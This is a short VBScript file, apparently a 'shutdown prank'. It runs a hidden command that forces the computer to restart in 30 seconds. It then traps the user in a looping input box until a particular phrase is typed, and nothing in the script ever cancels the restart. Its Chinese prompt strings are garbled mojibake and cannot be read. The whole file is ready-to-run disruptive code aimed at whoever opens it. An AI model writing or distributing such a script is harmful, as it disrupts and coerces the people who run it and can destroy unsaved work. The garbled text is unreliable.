on error resume next

dim WSHshellA

set WSHshellA = wscript.createobject("wscript.shell")

WSHshellA.run "cmd.exe /c shutdown -r -t 30 -c ""辦請啄啄ㄛ祥�遣騛�赻蛹"" ",0 ,true

dim a

do while(a <> "啄啄")

a = inputbox ("辦請啄啄,請""請啄啄"" ","請祥請","祥請",8000,7000)
msgbox chr(13) + chr(13) + chr(13) + a,0,"MsgBox"

loop